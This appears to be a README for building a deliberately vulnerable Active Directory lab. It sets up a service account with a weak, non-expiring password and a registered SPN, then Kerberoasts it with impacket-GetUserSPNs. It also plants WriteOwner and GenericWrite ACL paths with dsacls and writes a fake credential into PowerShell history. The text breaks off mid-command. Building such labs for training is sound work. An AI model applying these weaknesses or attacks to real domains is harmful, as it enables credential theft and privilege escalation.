### 🛠️ Step 1 — Create the sqlsvc User in Active Directory

#### Follow the steps below to create a dedicated SQL service account in Active Directory.

##### ✔️ Create the SQL Service Account (sqlsvc)

##### Open Server Manager
#### → Navigate to Tools
#### → Select Active Directory Users and Computers.

##### In the left panel, expand your domain and click on Users.

#### Right-click inside the Users pane and select:
#### New → User

#### Fill in the required details:

#### Field	Value
#### First Name	SQL
#### Last Name	Service
#### User logon name	sqlsvc

#### Click Next, then set the password:

### Password: Password@123


#### Configure password options:

#### ✔️ Password never expires

#### ❌ User must change password at next logon (leave unchecked)

#### Click Finish to create the user.

<img width="1053" height="483" alt="image" src="https://github.com/user-attachments/assets/19c5af51-a6fe-40af-995f-cbbf94d7b075" />

<img width="683" height="460" alt="image" src="https://github.com/user-attachments/assets/7835f7a9-4574-49a0-9de4-0f10364d146f" />
<br>

<img width="680" height="454" alt="image" src="https://github.com/user-attachments/assets/f6cd50f9-083f-466a-83ba-64d4b4ff7bf7" />
<br>

### 🔥 STEP 2 — Assign the SPN to sqlsvc

After creating the service account, assign the SQL Server SPN using setspn.

### ▶️ Command
    setspn -A MSSQLSvc/Infosec.sandeep.local:1433 sqlsvc

✅ Expected Output
Registered ServicePrincipalNames for CN=sqlsvc, CN=Users, DC=sandeep, DC=local

<img width="652" height="92" alt="image" src="https://github.com/user-attachments/assets/746788bc-6807-4e6a-bbb2-a064815d74a7" />
<br>

### 🔎 STEP 3 — Verify the SPN

Run the following command to confirm the SPN is properly registered:

### ▶️ Command
    setspn -L sqlsvc

✅ Expected Output
MSSQLSvc/Infosec.sandeep.local:1433

<img width="660" height="91" alt="image" src="https://github.com/user-attachments/assets/78ce35e2-a542-4371-abdf-8ee4a7db0dde" />

<br>

### 🧑‍💻 STEP 4 — Request the TGS Using Impacket (Kali Linux)

Now run GetUserSPNs to obtain the Kerberos TGS ticket hash.

### ▶️ Command
impacket-GetUserSPNs sandeep.local/emma:'Password@123' -dc-ip 192.168.29.193 -request

🟢 Expected Result

You will now receive a TGS hash:

$krb5tgs$23$sqlsvc$SANDEEP.LOCAL...

<img width="1063" height="719" alt="image" src="https://github.com/user-attachments/assets/bf257f8b-a5fd-4e59-98c2-ea6f896412e6" />

<img width="955" height="326" alt="image" src="https://github.com/user-attachments/assets/4ea6e10c-7ed2-4399-8419-7ed22273c63e" />

<img width="1335" height="470" alt="image" src="https://github.com/user-attachments/assets/b92ace06-be0b-4e87-8273-87ceb4ec1a3a" />


Create new Group Management 

    New-ADGroup -Name "Management" -GroupScope Global -GroupCategory Security
    
sqlsvc get Write owner to Management group

    dsacls "CN=Management,CN=Users,DC=sandeep,DC=local" /G "sandeep\sqlsvc:WO"


Generic write on leo

    dsacls "CN=leo,CN=Users,DC=sandeep,DC=local" /G "sandeep\Management:GW"


### hide peter password in powershell history

     Create the missing folders manually (recommended)

Run this inside Evil-WinRM:

    New-Item -ItemType Directory -Path "C:\Users\peter\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline" -Force


Then write the fake credential:

    "harry - harry12123" | Add-Content "C:\Users\peter\AppData\Roaming\Microsoft\Windows\Power






